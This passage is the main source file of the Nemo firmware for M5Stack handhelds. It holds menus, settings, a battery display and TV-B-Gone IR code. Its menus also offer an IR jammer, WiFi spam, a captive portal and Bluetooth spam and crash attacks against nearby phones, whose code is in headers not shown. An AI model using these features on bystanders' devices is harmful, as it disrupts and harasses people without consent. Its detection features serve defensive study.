// Nemo Firmware for the M5 Stack Stick C Plus
// github.com/n0xa | IG: @4x0nn

// -=-=-=-=-=-=- Uncomment the platform you're building for -=-=-=-=-=-=-
// #define STICK_C_PLUS
// #define STICK_C_PLUS2
// #define STICKS3
// #define STICK_C
// #define CARDPUTER
// -=-=- Uncommenting more than one at a time will result in errors -=-=-

// #define LANGUAGE_EN_US
// #define LANGUAGE_EN_GB
// #define LANGUAGE_PT_BR
// #define LANGUAGE_IT_IT
// #define LANGUAGE_FR_FR

uint16_t BGCOLOR=0x0001;
uint16_t FGCOLOR=0xFFF1;

#ifndef NEMO_VERSION
  #define NEMO_VERSION "dev"
#endif

#if !defined(CARDPUTER) && !defined(STICK_C_PLUS2) && !defined(STICK_C_PLUS) && !defined(STICK_C) && !defined(STICKS3)
  #define CARDPUTER
#endif

#if !defined(LANGUAGE_EN_US) && !defined(LANGUAGE_EN_GB) && !defined(LANGUAGE_PT_BR) && !defined(LANGUAGE_IT_IT) && !defined(LANGUAGE_FR_FR)
  #define LANGUAGE_EN_US
#endif

#if defined(STICK_C_PLUS)
  #include <M5Unified.h>
  String platformName="StickC+";
  #define BIG_TEXT 4
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
  #define M5LED 10
  #define RTC
  #define AXP
  #define ACTIVE_LOW_IR
  #define ROTATION
  #define USE_EEPROM
  #define DISP M5.Display
  #define IRLED 9
  #define SPEAKER M5.Speaker
  #define BITMAP Serial.println("unsupported")
  #define M5_BUTTON_HOME 37
  #define M5_BUTTON_RST 39
  #define MINBRIGHT 50
  #define SD_CLK_PIN 0
  #define SD_MISO_PIN 36
  #define SD_MOSI_PIN 26
  #define SD_CS_PIN -1
  #define M5LED_ON LOW
  #define M5LED_OFF HIGH
#endif

#if defined(STICK_C_PLUS2)
  #include <M5Unified.h>
  String platformName="StickC+2";
  #define BIG_TEXT 4
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
  #define ACTIVE_LOW_IR
  #define M5LED 19
  #define ROTATION
  #define USE_EEPROM
  #define RTC
  #define PWRMGMT
  #define SPEAKER M5.Speaker
  #define DISP M5.Display
  #define IRLED 19
  #define BITMAP M5.Display.drawBmp(NEMOMatrix, 97338)
  #define M5_BUTTON_MENU 35
  #define M5_BUTTON_HOME 37
  #define M5_BUTTON_RST 39
  #define BACKLIGHT 27
  #define MINBRIGHT 190
  #define SD_CLK_PIN 0
  #define SD_MISO_PIN 36
  #define SD_MOSI_PIN 26
  #define SD_CS_PIN 14
  #define M5LED_ON HIGH
  #define M5LED_OFF LOW
#endif

#if defined(STICKS3)
  #include <M5Unified.h>
  String platformName="StickS3";
  #define BIG_TEXT 4
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
  #define ACTIVE_LOW_IR
  #define M5LED 46
  #define ROTATION
  #define USE_EEPROM
  #define SDCARD
  #define PWRMGMT
  #define SPEAKER M5.Speaker
  #define DISP M5.Display
  #define IRLED 46
  #define BITMAP M5.Display.drawBmp(NEMOMatrix, 97338)
  #define M5_BUTTON_MENU 12
  #define M5_BUTTON_HOME 11
  #define M5_BUTTON_RST -1
  #define BACKLIGHT 38
  #define MINBRIGHT 2
  #define SD_CLK_PIN 0
  #define SD_MISO_PIN 1
  #define SD_MOSI_PIN 8
  #define SD_CS_PIN 14
  #define M5LED_ON HIGH
  #define M5LED_OFF LOW
  #define HID
#endif

#if defined(STICK_C)
  #include <M5Unified.h>
  String platformName="StickC";
  #define BIG_TEXT 2
  #define MEDIUM_TEXT 2
  #define SMALL_TEXT 1
  #define TINY_TEXT 1
  #define M5LED 10
  #define RTC
  #define AXP
  #define ROTATION
  #define USE_EEPROM
  #define SDCARD
  #define DISP M5.Display
  #define IRLED 9
  #define BITMAP Serial.println("unsupported")
  #define M5_BUTTON_HOME 37
  #define M5_BUTTON_RST 39
  #define MINBRIGHT 90
  #define SD_CLK_PIN 0
  #define SD_MISO_PIN 36
  #define SD_MOSI_PIN 26
  #define SD_CS_PIN -1
  #define M5LED_ON LOW
  #define M5LED_OFF HIGH
#endif

#if defined(CARDPUTER)
  #include <M5Cardputer.h>
  String platformName="Cardputer";
  #define BIG_TEXT 4
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
  #define KB
  #define HID
  #define ACTIVE_LOW_IR
  #define USE_EEPROM
  #define SDCARD
  #define DISP M5Cardputer.Display
  #define IRLED 44
  #define BACKLIGHT 38
  #define MINBRIGHT 165
  #define SPEAKER M5Cardputer.Speaker
  #define BITMAP M5Cardputer.Display.drawBmp(NEMOMatrix, 97338)
  #define SD_CLK_PIN 40
  #define SD_MISO_PIN 39
  #define SD_MOSI_PIN 14
  #define SD_CS_PIN 12
  #define M5LED_ON LOW
  #define M5LED_OFF HIGH
#endif

// Proc codes (новые 34, 35):
// 34 - SD Card File Browser (CARDPUTER only)
// 35 - IR Jammer
// 97 - Mount/UnMount SD Card

const String contributors[] PROGMEM = {
  "@bicurico","@bmorcelli","@chr0m1ng","@doflamingozk","@9Ri7",
  "@gustavocelani","@imxnoobx","@klamath1977","@marivaaldo","@mmatuda",
  "@n0xa","@niximkk","@unagironin","@vladimirpetrov","@vs4vijay"
};

int advtime = 0;
int cursor = 0;
int wifict = 0;
int brightness = 100;
int ajDelay = 1000;
int apSsidOffset = 16;
int apSsidMaxLen = 32;
int ph_alert_ssids = 5;
bool rstOverride = false;
bool sourApple = false;
bool swiftPair = false;
bool androidPair = false;
bool maelstrom = false;
bool portal_active = false;
bool activeQR = false; 
const byte PortalTickTimer = 1000;
String apSsidName = String("");
bool isSwitching = true;
#if defined(RTC)
  int current_proc = 0;
#else
  int current_proc = 1;
#endif
uint8_t channel;
String apMac = String("");
bool clone_flg = false;
float bh_max_rssi = -40;
int bh_pkts = 0;
float dh_max_rssi = -20;
int dh_pkts = 0;

#if defined(USE_EEPROM)
  #include <EEPROM.h>
  #define EEPROM_SIZE 64
#endif
#include <IRremote.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "applejuice.h"
#include "WORLD_IR_CODES.h"
#include "wifispam.h"
#include "sd.h"
#include "portal.h"
#include "NEMOMatrix.h"
#include "songs.h"
#include "localization.h"
#include <BLEUtils.h>
#include <BLEServer.h>
#include "deauth_hunter.h"
#include "ble_hunter.h"
#include "pineap_hunter.h"
#if defined(CARDPUTER)
#include "badusb_hunter.h"
#endif

struct MENU { char name[19]; int command; };
struct QRCODE { char name[19]; String url; };

QRCODE qrcodes[] = {
  { TXT_BACK, "" },
  { "Rickroll", "https://youtu.be/dQw4w9WgXcQ"},
  { "HackerTyper", "https://hackertyper.net/"},
  { "ZomboCom", "https://html5zombo.com/"},
};

void drawmenu(MENU thismenu[], int size) {
  DISP.setTextSize(SMALL_TEXT); DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0, 1);
  if (cursor >= size) cursor = 0;
  if (cursor < 0) cursor = size - 1;
  if (cursor > 5) {
    for (int i = 0 + (cursor - 5); i < size; i++) {
      if(cursor == i) DISP.setTextColor(BGCOLOR, FGCOLOR);
      DISP.printf(" %-19s\n", thismenu[i].name);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for (int i = 0; i < size; i++) {
      if(cursor == i) DISP.setTextColor(BGCOLOR, FGCOLOR);
      DISP.printf(" %-19s\n", thismenu[i].name);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
}

void number_drawmenu(int nums) {
  DISP.setTextSize(SMALL_TEXT); DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0);
  if (cursor > 5) {
    for (int i = 0 + (cursor - 5); i < nums; i++) {
      if(cursor == i) DISP.setTextColor(BGCOLOR, FGCOLOR);
      DISP.printf(" %-19d\n", i); DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for (int i = 0; i < nums; i++) {
      if(cursor == i) DISP.setTextColor(BGCOLOR, FGCOLOR);
      DISP.printf(" %-19d\n", i); DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
}

void switcher_button_proc() {
  if (rstOverride == false && !isSwitching) {
    if (check_next_press()) { isSwitching = true; current_proc = 1; }
  }
}

void check_menu_press() {
#if defined(AXP)
  M5.update();
  if (M5.Power.getKeyState()) {
#endif
#if defined(KB)
  if (M5Cardputer.Keyboard.isKeyPressed(',') || M5Cardputer.Keyboard.isKeyPressed('`')){
#endif
#if defined(M5_BUTTON_MENU) && !defined(STICKS3)
  if (digitalRead(M5_BUTTON_MENU) == LOW){
#endif
#if defined(AXP) || defined(KB) || (defined(M5_BUTTON_MENU) && !defined(STICKS3))
    dimtimer();
    if(portal_active){ shutdownWebServer(); portal_active = false; }
    isSwitching = true; rstOverride = false; current_proc = 1; delay(100);
  }
#endif
}

bool check_next_press(){
#if defined(KB)
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(';')){ cursor = cursor - 2; dimtimer(); return true; }
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_TAB) || M5Cardputer.Keyboard.isKeyPressed('.')){ dimtimer(); return true; }
#elif defined(STICKS3)
  if (digitalRead(12) == LOW){ dimtimer(); return true; }
#else
  if (digitalRead(M5_BUTTON_RST) == LOW){ dimtimer(); return true; }
#endif
  return false;
}

bool check_select_press(){
#if defined(KB)
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed('/')){ dimtimer(); return true; }
#else
  if (digitalRead(M5_BUTTON_HOME) == LOW){ dimtimer(); return true; }
#endif
  return false;
}

class MenuController {
private:
  MENU* currentMenu; int menuSize;
  void (*onExit)(); void (*onSelect)();
public:
  void setup(MENU* menu, int size, void (*exitCallback)() = nullptr, void (*selectCallback)() = nullptr) {
    currentMenu = menu; menuSize = size; onExit = exitCallback; onSelect = selectCallback;
    cursor = 0; rstOverride = true; drawmenu(currentMenu, menuSize); delay(500);
  }
  void setupWithIntro(MENU* menu, int size, String introText, int introDelay = 1000) {
    DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0); DISP.println(introText); delay(introDelay); setup(menu, size);
  }
  void loop() {
    if (check_next_press()) { cursor++; cursor = cursor % menuSize; drawmenu(currentMenu, menuSize); delay(250); }
    if (check_select_press()) {
      if (onSelect) { onSelect(); if (!isSwitching) rstOverride = true; }
      else { rstOverride = false; if (onExit) onExit(); isSwitching = true; current_proc = currentMenu[cursor].command; }
    }
  }
  void numberLoop(int maxNum) {
    if (check_next_press()) { cursor++; cursor = cursor % maxNum; number_drawmenu(maxNum); delay(250); }
    if (check_select_press()) { rstOverride = false; isSwitching = true; current_proc = 1; }
  }
};

MenuController menuController;

MENU mmenu[] = {
#if defined(RTC)
  { TXT_CLOCK, 0},
#endif
  { "TV-B-Gone", 13},
  { "Bluetooth", 16},
  { "WiFi", 12},
#if defined(CARDPUTER)
  { "BadUSB Hunter", 27},
#endif
#if defined(CARDPUTER)
  { "SD", 34},
#endif
  { "IR Jammer", 35},
  { "QR Codes", 18},
  { TXT_SETTINGS, 2},
};
int mmenu_size = sizeof(mmenu) / sizeof(MENU);

void mmenu_setup() { menuController.setup(mmenu, mmenu_size); }

bool screen_dim_dimmed = false;
int screen_dim_time = 30;
int screen_dim_current = 0;

void screenBrightness(int bright){
  Serial.printf("Brightness: %d\n", bright);
  #if defined(AXP)
    M5.Display.setBrightness(MINBRIGHT + round((float)((255 - MINBRIGHT) * bright / 100)));
  #endif
  #if defined(BACKLIGHT)
    int bl = MINBRIGHT + round((float)((255 - MINBRIGHT) * bright / 100));
    analogWrite(BACKLIGHT, bl);
  #endif
}

int uptime(){ return(int(millis() / 1000)); }

void dimtimer(){
  if(screen_dim_dimmed){ screenBrightness(brightness); screen_dim_dimmed = false; }
  screen_dim_current = uptime() + screen_dim_time + 2;
}

void screen_dim_proc() {
  if(screen_dim_time > 0){
    if (screen_dim_dimmed == false) {
      if (uptime() == screen_dim_current || (uptime() + 1) == screen_dim_current || (uptime() + 2) == screen_dim_current) {
        screenBrightness(0); screen_dim_dimmed = true;
      }
    }
  }
}

MENU dmenu[] = {
  { TXT_BACK, screen_dim_time},{ TXT_NEVER, 0},{ ("5 " TXT_SEC), 5},{ ("10 " TXT_SEC), 10},
  { ("15 " TXT_SEC), 15},{ ("30 " TXT_SEC), 30},{ ("60 " TXT_SEC), 60},
  { ("120 " TXT_MIN), 120},{ ("240 " TXT_MIN), 240},
};
int dmenu_size = sizeof(dmenu) / sizeof(MENU);

void dmenu_onSelect() {
  screen_dim_time = dmenu[cursor].command;
  #if defined(USE_EEPROM)
    EEPROM.write(1, screen_dim_time); EEPROM.commit();
  #endif
  DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0); DISP.println(String(TXT_SET_BRIGHT)); delay(1000);
  cursor = brightness / 10; number_drawmenu(11);
  while( !check_select_press()) {
    if (check_next_press()) { cursor++; cursor = cursor % 11; number_drawmenu(11); screenBrightness(10 * cursor); delay(250); }
  }
  screenBrightness(10 * cursor); brightness = 10 * cursor;
  #if defined(USE_EEPROM)
    EEPROM.write(2, brightness); EEPROM.commit();
  #endif
  rstOverride = false; isSwitching = true; current_proc = 2;
}

void dmenu_setup() {
  DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0); DISP.println(String(TXT_AUTO_DIM)); delay(1000);
  menuController.setup(dmenu, dmenu_size, nullptr, dmenu_onSelect);
}

MENU smenu[] = {
  { TXT_BACK, 1},
#if defined(AXP) || defined(PWRMGMT) || defined(CARDPUTER)
  { TXT_BATT_INFO, 6},
#endif
  { TXT_BRIGHT, 4},
#if defined(RTC)
  { TXT_SET_CLOCK, 3},
#endif
#if defined(ROTATION)
  { TXT_ROTATION, 7},
#endif
#if defined(SDCARD) && !defined(CARDPUTER)
  { TXT_SDCARD, 97},
#endif
  { "BH RSSI", 29},{ "DH RSSI", 30},{ "BH Alert Pkts", 31},{ "DH Alert Pkts", 32},
  { TXT_PH_ALERT_SSIDS, 33},{ TXT_THEME, 23},{ TXT_ABOUT, 10},{ TXT_REBOOT, 98},
#if defined(USE_EEPROM)
  { TXT_CLR_SETTINGS, 99},
#endif
};
int smenu_size = sizeof(smenu) / sizeof (MENU);

void smenu_onSelect() {
  if(smenu[cursor].command == 98){ rstOverride = false; ESP.restart(); }
  else if(smenu[cursor].command == 99){ rstOverride = false; clearSettings(); }
  else { rstOverride = false; isSwitching = true; current_proc = smenu[cursor].command; }
}

void smenu_setup() { menuController.setup(smenu, smenu_size, nullptr, smenu_onSelect); }

void clearSettings(){
  #if defined(USE_EEPROM)
  for(int i = 0; i < EEPROM_SIZE; i++) { EEPROM.write(i, 255); Serial.printf("clearing byte %d\n", i); }
  EEPROM.commit();
  #endif
  screenBrightness(100); DISP.fillScreen(BLUE); DISP.setTextSize(BIG_TEXT); DISP.setRotation(1);
  DISP.setTextColor(BLUE, WHITE); DISP.setCursor(40, 0); DISP.println("M5-NEMO");
  DISP.setTextColor(WHITE, BLUE); DISP.setTextSize(SMALL_TEXT); DISP.println(TXT_CLRING_SETTINGS);
  delay(5000); ESP.restart();
}

MENU cmenu[] = {
  { TXT_BACK, 0},{ TXT_BLACK, 1},{ TXT_NAVY, 2},{ TXT_DARKGREEN, 3},{ TXT_DARKCYAN, 4},
  { TXT_MAROON, 5},{ TXT_PURPLE, 6},{ TXT_OLIVE, 7},{ TXT_LIGHTGREY, 8},{ TXT_DARKGREY, 9},
  { TXT_BLUE, 10},{ TXT_GREEN, 11},{ TXT_CYAN, 12},{ TXT_RED, 13},{ TXT_MAGENTA, 14},
  { TXT_YELLOW, 15},{ TXT_WHITE, 16},{ TXT_ORANGE, 17},{ TXT_GREENYELLOW, 18},{ TXT_PINK, 19},
};
int cmenu_size = sizeof(cmenu) / sizeof (MENU);

void setcolor(bool fg, int col){
  uint16_t color = 0x0000;
  switch (col){
    case 1: color=0x0000; break; case 2: color=0x000F; break;
    case 3: color=0x03E0; break; case 4: color=0x03EF; break;
    case 5: color=0x7800; break; case 6: color=0x780F; break;
    case 7: color=0x7BE0; break; case 8: color=0xC618; break;
    case 9: color=0x7BEF; break; case 10: color=0x001F; break;
    case 11: color=0x07E0; break; case 12: color=0x07FF; break;
    case 13: color=0xF800; break; case 14: color=0xF81F; break;
    case 15: color=0xFFE0; break; case 16: color=0xFFFF; break;
    case 17: color=0xFDA0; break; case 18: color=0xB7E0; break;
    case 19: color=0xFC9F; break;
  }
  if(fg){ FGCOLOR=color; } else { BGCOLOR=color; }
  if(FGCOLOR == BGCOLOR){ BGCOLOR = FGCOLOR ^ 0xFFFF; }
  DISP.setTextColor(FGCOLOR, BGCOLOR);
}

void color_setup() {
  DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0); DISP.println(String(TXT_SET_FGCOLOR)); cursor = 0;
  #if defined(USE_EEPROM)
    cursor=EEPROM.read(4);
  #endif
  rstOverride = true; delay(1000); drawmenu(cmenu, cmenu_size);
}

void color_loop() {
  if (check_next_press()) {
    setcolor(EEPROM.read(5), false); cursor++; cursor = cursor % cmenu_size;
    setcolor(true, cursor); drawmenu(cmenu, cmenu_size); delay(250);
  }
  if (check_select_press()) {
    #if defined(USE_EEPROM)
      EEPROM.write(4, cursor); EEPROM.commit(); cursor=EEPROM.read(5);
    #endif
    DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0); DISP.println(String(TXT_SET_BGCOLOR)); delay(1000);
    setcolor(false, cursor); drawmenu(cmenu, cmenu_size);
    while( !check_select_press()) {
      if (check_next_press()) { cursor++; cursor = cursor % cmenu_size; setcolor(false, cursor); drawmenu(cmenu, cmenu_size); delay(250); }
    }
    #if defined(USE_EEPROM)
      EEPROM.write(5, cursor); EEPROM.commit();
    #endif
    rstOverride = false; isSwitching = true; current_proc = 2;
  }
}

MENU thmenu[] = {
  { TXT_BACK, 0},{ "Nemo", 1},{ "Tux", 2},{ "Bill", 3},{ "Steve", 4},{ "Lilac", 5},
  { "Contrast", 6},{ "NightShift", 7},{ "Camo", 8},{ "BubbleGum", 9},{ TXT_COLOR, 99},
};
int thmenu_size = sizeof(thmenu) / sizeof (MENU);

void theme_setup() {
  DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0); DISP.println(String(TXT_THEME));
  cursor = 0; rstOverride = true; delay(1000); drawmenu(thmenu, thmenu_size);
}

int BG=0; int FG=0;

void theme_loop() {
  if (check_next_press()) {
    cursor++; cursor = cursor % thmenu_size;
    switch (thmenu[cursor].command){
      case 0: FG=11; BG=1; break;
      case 1: FG=11; BG=1; break;
      case 2: FG=8; BG=1; break;
      case 3: FG=16; BG=10; break;
      case 4: FG=1; BG=8; break;
      case 5: FG=19; BG=6; break;
      case 6: FG=16; BG=1; break;
      case 7: FG=5; BG=1; break;
      case 8: FG=1; BG=7; break;
      case 9: FG=1; BG=19; break;
      case 99: FG=11; BG=1; break;
    }
    setcolor(true, FG); setcolor(false, BG); drawmenu(thmenu, thmenu_size); delay(250);
  }
  if (check_select_press()) {
    switch (thmenu[cursor].command){
      case 99: rstOverride = false; isSwitching = true; current_proc = 22; break;
      case 0:
        #if defined(USE_EEPROM)
          setcolor(true, EEPROM.read(4)); setcolor(false, EEPROM.read(5));
        #endif
        rstOverride = false; isSwitching = true; current_proc = 2; break;
      default:
        #if defined(USE_EEPROM)
          EEPROM.write(4, FG); EEPROM.write(5, BG); EEPROM.commit();
        #endif
        rstOverride = false; isSwitching = true; current_proc = 2;
    }
  }
}

int rotation = 1;
#if defined(ROTATION)
  MENU rmenu[] = { { TXT_BACK, rotation},{ TXT_RIGHT, 1},{ TXT_LEFT, 3}, };
  int rmenu_size = sizeof(rmenu) / sizeof (MENU);
  void rmenu_onSelect() {
    rstOverride = false; isSwitching = true;
    rotation = rmenu[cursor].command; DISP.setRotation(rotation);
    #if defined(USE_EEPROM)
      EEPROM.write(0, rotation); EEPROM.commit();
    #endif
    current_proc = 2;
  }
  void rmenu_setup() { menuController.setup(rmenu, rmenu_size, nullptr, rmenu_onSelect); }
#endif

uint16_t getBatteryColor(int battery) {
  if(battery < 20) return RED; else if(battery < 60) return ORANGE; else return GREEN;
}

void battery_drawmenu(int battery, float voltage_b = 0, float voltage_c = 0) {
  DISP.fillScreen(BGCOLOR);
  uint16_t batteryColor = getBatteryColor(battery);
#if defined(STICK_C)
  int barX = 10, barY = 25, barW = 100, barH = 20;
  int textX = 45, textY = 50; int exitY = 70; int textSize = SMALL_TEXT;
#else
  int barX = 10, barY = 20, barW = 220, barH = 40;
  int textX = 100, textY = 70; int exitY = 120; int textSize = BIG_TEXT;
#endif
  DISP.drawRect(barX, barY, barW, barH, batteryColor);
  int fillW = (barW - 4) * battery / 100;
  if (fillW > 0) DISP.fillRect(barX + 2, barY + 2, fillW, barH - 4, batteryColor);
  DISP.drawRect(barX + barW, barY + barH/4, 3, barH/2, batteryColor);
  DISP.fillRect(barX + barW, barY + barH/4, 3, barH/2, batteryColor);
  DISP.setTextColor(FGCOLOR, BGCOLOR); DISP.setTextSize(textSize);
  DISP.setCursor(textX, textY, 1); DISP.print(battery); DISP.println("%");
  DISP.setTextSize(TINY_TEXT); DISP.setCursor(10, exitY, 1); DISP.println(TXT_EXIT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
}

#if defined(PWRMGMT)
  int old_battery = 0;
  int get_battery_voltage() { return M5.Power.getBatteryLevel(); }
  void battery_setup() { int battery = get_battery_voltage(); battery_drawmenu(battery); delay(500); }
  void battery_loop() {
    delay(300); int battery = get_battery_voltage();
    if (battery != old_battery) battery_drawmenu(battery);
    if (check_select_press()) { isSwitching = true; current_proc = 1; }
    old_battery = battery;
  }
#endif

#ifdef AXP
  int old_battery=0; float old_b=0, old_c=0;
  void battery_setup() {
    rstOverride = false;
    float c = M5.Power.Axp192.getBatteryChargeCurrent() / 1000.0;
    float b = M5.Power.getBatteryVoltage() / 1000.0;
    int battery = M5.Power.getBatteryLevel();
    battery_drawmenu(battery, b, c); delay(500);
  }
  void battery_loop() {
    delay(300);
    float c = M5.Power.Axp192.getBatteryChargeCurrent() / 1000.0;
    float b = M5.Power.getBatteryVoltage() / 1000.0;
    int battery = M5.Power.getBatteryLevel();
    if (battery != old_battery || b != old_b || c != old_c){ battery_drawmenu(battery, b, c); old_b = b; old_c = c; }
    if (check_select_press()) { rstOverride = false; isSwitching = true; current_proc = 1; }
    old_battery = battery;
  }
#endif

#if defined(CARDPUTER)
  uint8_t oldBattery = 0;
  void battery_setup() {
    rstOverride = false;
    int battery = M5.Power.getBatteryLevel();
    // [FIX] Защита от отрицательных значений при старте
    if (battery < 0) battery = 0;
    if (battery > 100) battery = 100;
    battery_drawmenu(battery);
    delay(500);
  }
  void battery_loop() {
    int32_t batteryValues = 0; // [FIX] int32_t вместо uint32_t
    for(uint8_t i = 0; i < 30; i++) {
      delay(100);
      int val = M5.Power.getBatteryLevel();
      // [FIX] Отсекаем ошибочные значения
      if (val < 0) val = 0;
      if (val > 100) val = 100;
      batteryValues += val;
      
      M5Cardputer.update();
      if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
        rstOverride = false; isSwitching = true; current_proc = 1; break;
      }
    }
    if(!isSwitching) {
      uint8_t battery = batteryValues / 30;
      if(battery != oldBattery) { oldBattery = battery; battery_drawmenu(battery); }
    }
  }
#endif

void tvbgone_setup() {
  DISP.fillScreen(BGCOLOR); DISP.setTextSize(BIG_TEXT); DISP.setCursor(0, 0);
  DISP.println("TV-B-Gone"); DISP.setTextSize(SMALL_TEXT);
  #if defined(STICKS3)
  M5.Power.setExtOutput(true); delay(50);
  #endif
  IrSender.begin(IRLED); digitalWrite(IRLED, M5LED_OFF);
  delay_ten_us(5000);
  if(region == NA) DISP.print(TXT_RG_AMERICAS); else DISP.println(TXT_RG_EMEA);
  DISP.println(TXT_SEL_GO_PAUSE); DISP.println(TXT_SEL_EXIT); delay(1000);
}

void tvbgone_loop() {
  if (check_select_press()) { delay(250); Serial.println(TXT_TRIG_TV); sendAllCodes(); }
}

MENU tvbgmenu[] = { { TXT_BACK, 3},{ TXT_MN_AMERICA, 0},{ TXT_MN_EMEA, 1}, };
int tvbgmenu_size = sizeof(tvbgmenu) / sizeof (MENU);

void tvbgmenu_onSelect() {
  region = tvbgmenu[cursor].command;
  if (region == 3) { current_proc = 1; isSwitching = true; rstOverride = false; return; }
  #if defined(USE_EEPROM)
    EEPROM.write(3, region); EEPROM.commit();
  #endif
  rstOverride = false; isSwitching = true; current_proc = 5;
}

void tvbgmenu_setup() {
  DISP.fillScreen(BGCOLOR); DISP.setTextSize(BIG_TEXT); DISP.setCursor(0, 0);
  DISP.println("TV-B-Gone"); DISP.setTextSize(MEDIUM_TEXT); DISP.println(TXT_REGION); delay(1000);
  int initialCursor = region % 2;
  menuController.setup(tvbgmenu, tvbgmenu_size, nullptr, tvbgmenu_onSelect);
  cursor = initialCursor; drawmenu(tvbgmenu, tvbgmenu_size);
}

void sendAllCodes() {
  bool endingEarly = false;
  if (region == NA) num_codes = num_NAcodes; else num_codes = num_EUcodes;
  for (i = 0 ; i < num_codes; i++) {
    if (region == NA) powerCode = NApowerCodes[i]; else powerCode = EUpowerCodes[i];
    const uint8_t freq = powerCode->timer_val;
    const uint8_t numpairs = powerCode->numpairs;
    DISP.fillScreen(BGCOLOR); DISP.setTextSize(BIG_TEXT); DISP.setCursor(0, 0);
    DISP.println("TV-B-Gone"); DISP.setTextSize(SMALL_TEXT); DISP.println(TXT_FK_GP);
    const uint8_t bitcompression = powerCode->bitcompression;
    code_ptr = 0;
    for (uint8_t k = 0; k < numpairs; k++) {
      uint16_t ti; ti = (read_bits(bitcompression)) * 2;
      #if defined(ACTIVE_LOW_IR)
        offtime = powerCode->times[ti]; ontime = powerCode->times[ti + 1];
      #else
        ontime = powerCode->times[ti]; offtime = powerCode->times[ti + 1];
      #endif
      DISP.setTextSize(TINY_TEXT); DISP.printf("rti = %d Pair = %d, %d\n", ti >> 1, ontime, offtime);
      rawData[k * 2] = offtime * 10; rawData[(k * 2) + 1] = ontime * 10;
    }
    IrSender.sendRaw(rawData, (numpairs * 2), freq);
    digitalWrite(IRLED, M5LED_OFF); bitsleft_r = 0; delay_ten_us(20500);
    #if defined(AXP) || defined(STICKS3)
    M5.update();
    if (M5.Power.getKeyState()) {
      endingEarly = true; current_proc = 1; isSwitching = true; rstOverride = false; break;
    }
    #endif
    if (check_select_press()){ endingEarly = true; delay(250); break; }
  }
  if (endingEarly == false) {
    delay_ten_us(MAX_WAIT_TIME); delay_ten_us(MAX_WAIT_TIME); quickflashLEDx(8);
  }
  DISP.fillScreen(BGCOLOR); DISP.setTextSize(BIG_TEXT); DISP.setCursor(0, 0);
  DISP.println("TV-B-Gone"); DISP.setTextSize(SMALL_TEXT);
  DISP.println(TXT_SEL_GO_PAUSE); DISP.println(TXT_SEL_EXIT);
}

#if defined(RTC)
  void clock_setup() { DISP.fillScreen(BGCOLOR); DISP.setTextSize(1); }
  void clock_loop() {
    DISP.setCursor(10, 40, 7);
    #if defined(STICK_C_PLUS2) || defined(STICK_C) || defined(STICK_C_PLUS)
      auto dt = M5.Rtc.getDateTime();
      DISP.printf("%02d:%02d:%02d\n", dt.time.hours, dt.time.minutes, dt.time.seconds);
    #else
      M5.Rtc.GetBm8563Time();
      DISP.printf("%02d:%02d:%02d\n", M5.Rtc.Hour, M5.Rtc.Minute, M5.Rtc.Second);
    #endif
    check_select_press();
  }
  void timeset_setup() {
    rstOverride = true; DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0);
    DISP.println(TXT_SET_HOUR); delay(2000);
  }
  void timeset_loop() {
  #if defined(STICK_C_PLUS2) || defined(STICK_C) || defined(STICK_C_PLUS)
    auto dt = M5.Rtc.getDateTime(); cursor = dt.time.hours;
  #else
    M5.Rtc.GetBm8563Time(); cursor = M5.Rtc.Hour;
  #endif
    number_drawmenu(24);
    while(digitalRead(M5_BUTTON_HOME) == HIGH) {
      if (check_next_press()) { cursor++; cursor = cursor % 24; number_drawmenu(24); delay(100); }
    }
    int hour = cursor;
    DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0); DISP.println(TXT_SET_MIN); delay(2000);
    #if defined(STICK_C_PLUS2) || defined(STICK_C) || defined(STICK_C_PLUS)
      cursor = dt.time.minutes;
    #else
      cursor = M5.Rtc.Minute;
    #endif
    number_drawmenu(60);
    while(digitalRead(M5_BUTTON_HOME) == HIGH) {
      if (check_next_press()) { cursor++; cursor = cursor % 60; number_drawmenu(60); delay(100); }
    }
    int minute = cursor;
    DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0);
    #if defined(STICK_C_PLUS2) || defined(STICK_C) || defined(STICK_C_PLUS)
       M5.Rtc.setDateTime( { { dt.date.year, dt.date.month, dt.date.date }, { hour, minute, 0 } } );
    #else
      RTC_TimeTypeDef TimeStruct;
      TimeStruct.Hours = hour; TimeStruct.Minutes = minute; TimeStruct.Seconds = 0;
      M5.Rtc.SetTime(&TimeStruct);
    #endif
    DISP.printf("Setting Time:\n%02d:%02d:00",hour,minute); delay(2000);
    rstOverride = false; isSwitching = true; current_proc = 0;
  }
#endif

MENU btmenu[] = {
  { TXT_BACK, 5},{ "AppleJuice", 0},{ "Swift Pair", 1},{ "Android Spam", 4},
  { TXT_SA_CRASH, 2},{ "BT Maelstrom", 3},{ "BLE Hunter", 25},
};
int btmenu_size = sizeof(btmenu) / sizeof (MENU);

void btmenu_setup() {
  cursor = 0; sourApple = false; swiftPair = false; maelstrom = false; androidPair = false;
  rstOverride = true; drawmenu(btmenu, btmenu_size); delay(500);
}

void btmenu_loop() {
